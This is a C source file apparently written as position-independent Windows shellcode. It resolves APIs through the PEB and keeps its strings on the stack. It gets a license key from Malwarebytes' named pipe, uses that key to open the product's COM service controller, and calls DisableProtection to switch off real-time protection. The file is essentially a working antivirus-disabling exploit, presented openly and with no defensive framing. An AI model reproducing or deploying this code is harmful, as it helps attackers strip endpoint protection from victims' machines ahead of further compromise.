#include <Windows.h>
#include <winternl.h>
#include <combaseapi.h>
#include <OCIdl.h>

#include "MbamInterfaces/AEController.h"
#include "MbamInterfaces/ArwController.h"
#include "MbamInterfaces/CleanController.h"
#include "MbamInterfaces/CloudController.h"
#include "MbamInterfaces/LicenseController.h"
#include "MbamInterfaces/LogController.h"
#include "MbamInterfaces/MBAMService.h"
#include "MbamInterfaces/MWACController.h"
#include "MbamInterfaces/PoliciesController.h"
#include "MbamInterfaces/RTPController.h"
#include "MbamInterfaces/ScanController.h"
#include "MbamInterfaces/SPController.h"
#include "MbamInterfaces/TelemetryController.h"
#include "MbamInterfaces/UpdateController.h"

#pragma comment(linker, "/ENTRY:Entry")

#define APICALL(ProcName, TypeDef, ...) \
	((TypeDef)_GetProcAddress((PCSTR)ProcName))(__VA_ARGS__)

//
// Code references from:
// http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html
//

HMODULE
_GetProcAddress(
	_In_ PCSTR pProcName
);

DWORD
_Strcmp(
	_In_ PCSTR pStr1,
	_In_ PCSTR pStr2
);
typedef struct _MY_PEB_LDR_DATA {
	ULONG Length;
	BOOL Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

typedef struct _FILE_LINK_INFORMATION {
	BOOLEAN ReplaceIfExists;
	HANDLE  RootDirectory;
	ULONG   FileNameLength;
	WCHAR   FileName[1];
} FILE_LINK_INFORMATION, *PFILE_LINK_INFORMATION;

typedef
HMODULE
(WINAPI *LOADLIBRARYA) (
	LPCSTR lpLibFileName
);

typedef
FARPROC
(WINAPI *GETPROCADDRESS) (
	HMODULE hModule,
	LPCSTR lpProcName
);

typedef
HRESULT
(WINAPI *COINITIALIZE) (
	LPVOID pvReserved
);

typedef
BOOL
(WINAPI *CALLNAMEDPIPEA) (
	LPCSTR lpNamedPipeName,
	LPVOID lpInBuffer,
	DWORD nInBufferSize,
	LPVOID lpOutBuffer,
	DWORD nOutBufferSize,
	LPDWORD lpBytesRead,
	DWORD nTimeOut
);

typedef
HRESULT
(WINAPI *COGETCLASSOBJECT) (
	REFCLSID rclsid,
	DWORD dwClsContext,
	LPVOID pvReserved,
	REFIID riid,
	LPVOID *ppv
);

typedef
HRESULT
(WINAPI *COCREATEINSTANCE) (
	REFCLSID rclsid,
	LPUNKNOWN pUnkOuter,
	DWORD dwClsContext,
	REFIID riid,
	LPVOID *ppv
);

typedef
BSTR
(WINAPI *SYSALLOCSTRINGLEN) (
	const OLECHAR *strIn,
	UINT ui
);

typedef
void
(WINAPI *SYSFREESTRING) (
	BSTR bstrString
);

typedef
void
(WINAPI *EXITPROCESS) (
	UINT uExitCode
);

VOID
Entry(
)
{
	//
	// Variables to store output.
	//
	WCHAR wKey[1024];
	BSTR bStr;
	DWORD dwRead;

	//
	// IIDs and CLSID stored on the stack for shellcode.
	//
	IID iClassFactory = { 0x00000001, 0x0000, 0x0000, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 };
	IID iClassFactory2 = { 0xB196B28F, 0xBAB4, 0x101A, 0xB6, 0x9C, 0x00, 0xAA, 0x00, 0x34, 0x1D, 0x07 };
	IID iMBAMServiceController = { 0x31A02CB9,0x6064,0x4A3B,0xBC,0xB4,0xA3,0x29,0x52,0x8D,0x46,0x48 };
	CLSID csMBAMServiceController = { 0xF36AD0D0, 0xB5F0, 0x4C69, 0xAF, 0x08, 0x60, 0x3D, 0x17, 0x7F, 0xEF, 0x0E };

	//
	// Define the strings of the functions on the stack (because shellcode).
	//
	BYTE bLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
	BYTE bGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
	BYTE bOle32[] = { 'o', 'l', 'e', '3', '2', 0 };
	BYTE bCoInitialize[] = { 'C', 'o', 'I', 'n', 'i', 't', 'i', 'a', 'l', 'i', 'z', 'e', 0 };
	BYTE bCallNamedPipeA[] = { 'C', 'a', 'l', 'l', 'N', 'a', 'm', 'e', 'd', 'P', 'i', 'p', 'e', 'A', 0 };
	BYTE bCoGetClassObject[] = { 'C', 'o', 'G', 'e', 't', 'C', 'l', 'a', 's', 's', 'O', 'b', 'j', 'e', 'c', 't', 0 };
	BYTE bOleAut32[] = { 'O', 'l', 'e', 'A', 'u', 't', '3', '2', 0 };
	BYTE bSysAllocStringLen[] = { 'S', 'y', 's', 'A', 'l', 'l', 'o', 'c', 'S', 't', 'r', 'i', 'n', 'g', 'L', 'e', 'n', 0 };
	BYTE bSysFreeString[] = { 'S', 'y', 's', 'F', 'r', 'e', 'e', 'S', 't', 'r', 'i', 'n', 'g', 0 };
	BYTE bExitProcess[] = { 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
	BYTE bPipe[] = { '\\', '\\', '.', '\\',  'p', 'i', 'p', 'e', '\\', 'M', 'B', 'L', 'G', 0 };
	BYTE bNeedAKey[] = { 'N', 'e', 'e', 'd', 'A', 'K', 'e', 'y', 0 };

	//
	// Load the functions and libraries into the process (because shellcode).
	//
	HMODULE hOle32 = APICALL(bLoadLibraryA, LOADLIBRARYA, bOle32);
	APICALL(bLoadLibraryA, LOADLIBRARYA, bOleAut32);

	//
	// Initialize COM to use it for interfacing with Malwarebytes' service.
	//
	APICALL(bCoInitialize, COINITIALIZE, NULL);

	SecureZeroMemory(&wKey, sizeof(wKey));

	//
	// We need CallNamedPipe IPC to ask the Malwarebytes service for a COM license
	// via the Malwarebytes License Generator named pipe. This is where the service
	// will attempt to validate the process (and its image file) to stop randoms
	// from attempting to interface with their service (can be trivially bypassed,
	// who would've thought /s).
	// Store the returned license into wKey for later use.
	///
	APICALL(
		bCallNamedPipeA, 
		CALLNAMEDPIPEA, 
		(PCSTR)bPipe, 
		bNeedAKey, 
		8, 
		wKey, 
		1024, 
		&dwRead, 
		1000
	);

	//
	// Obtain the IClassFactory interface from the Malwarebytes service controller's
	// class object.
	//
	IClassFactory *fac = NULL;
	COGETCLASSOBJECT _CoGetClassObject = (COGETCLASSOBJECT)APICALL(
		bGetProcAddress, 
		GETPROCADDRESS, 
		hOle32, 
		bCoGetClassObject
	);

	_CoGetClassObject(
		&csMBAMServiceController, 
		CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_REMOTE_SERVER, 
		NULL, 
		&iClassFactory, 
		(LPVOID *)&fac
	);

	//
	// Get the IClassFactory2 interface from the IClassFactory from before.
	//
	IClassFactory2 *fac2 = NULL;
	fac->lpVtbl->QueryInterface(
		fac,
		&iClassFactory2,
		(LPVOID *)&fac2
	);

	//
	// Allocate the obtained key (from the CallNamedPipe IPC) into a BSTR.
	//
	bStr = APICALL(bSysAllocStringLen, SYSALLOCSTRINGLEN, wKey, 0x40);

	//
	// Request the Malwarebytes service controller interface using the key wed got.
	//
	IMBAMServiceController *sc = NULL;
	fac2->lpVtbl->CreateInstanceLic(
		fac2,
		NULL,
		NULL,
		&iMBAMServiceController,
		bStr,
		(LPVOID *)&sc
	);

	IRTPController* rtp = NULL;
	sc->lpVtbl->get_RTPController(sc, &rtp);

	rtp->lpVtbl->DisableProtection(rtp);

	//
	// Goodbye.
	//
	APICALL(bExitProcess, EXITPROCESS, 0);
}

HMODULE
_GetProcAddress(
	_In_ PCSTR pProcName
)
{
	PPEB PebAddress;
	PMY_PEB_LDR_DATA pLdr;
	PMY_LDR_DATA_TABLE_ENTRY pDataTableEntry;
	PVOID pModuleBase;
	PIMAGE_NT_HEADERS pNTHeader;
	DWORD dwExportDirRVA;
	PIMAGE_EXPORT_DIRECTORY pExportDir;
	PLIST_ENTRY pNextModule;
	DWORD dwNumFunctions;
	USHORT usOrdinalTableIndex;
	PDWORD pdwFunctionNameBase;
	PCSTR pFunctionName;
	UNICODE_STRING BaseDllName;
	DWORD dwModuleHash;
	PCSTR pTempChar;
	DWORD i;

#if defined(_WIN64)
	PebAddress = (PPEB)__readgsqword(0x60);
#else
	PebAddress = (PPEB)__readfsdword(0x30);
#endif

	pLdr = (PMY_PEB_LDR_DATA)PebAddress->Ldr;
	pNextModule = pLdr->InLoadOrderModuleList.Flink;
	pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pNextModule;

	while (pDataTableEntry->DllBase != NULL) {
		dwModuleHash = 0;
		pModuleBase = pDataTableEntry->DllBase;
		BaseDllName = pDataTableEntry->BaseDllName;
		pNTHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModuleBase + ((PIMAGE_DOS_HEADER)pModuleBase)->e_lfanew);
		dwExportDirRVA = pNTHeader->OptionalHeader.DataDirectory[0].VirtualAddress;

		pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pDataTableEntry->InLoadOrderLinks.Flink;

		if (dwExportDirRVA == 0)
			continue;

		pExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)pModuleBase + dwExportDirRVA);

		dwNumFunctions = pExportDir->NumberOfNames;
		pdwFunctionNameBase = (PDWORD)((PCHAR)pModuleBase + pExportDir->AddressOfNames);

		for (i = 0; i < dwNumFunctions; i++) {
			pFunctionName = (PCSTR)(*pdwFunctionNameBase + (ULONG_PTR)pModuleBase);
			pdwFunctionNameBase++;

			pTempChar = pFunctionName;

			if (!_Strcmp(pFunctionName, pProcName)) {
				usOrdinalTableIndex = *(PUSHORT)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfNameOrdinals) + (2 * (SIZE_T)i));
				return (HMODULE)((ULONG_PTR)pModuleBase + *(PDWORD)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfFunctions) + (4 * (SIZE_T)usOrdinalTableIndex)));
			}
		}
	}

	return NULL;
}

DWORD
_Strcmp(
	_In_ PCSTR pStr1,
	_In_ PCSTR pStr2
)
{
	DWORD i;

	for (i = 0; pStr1[i] || pStr2[i]; i++) {
		if (pStr1[i] != pStr2[i]) {
			return ~0;
		}
	}

	return 0;
}
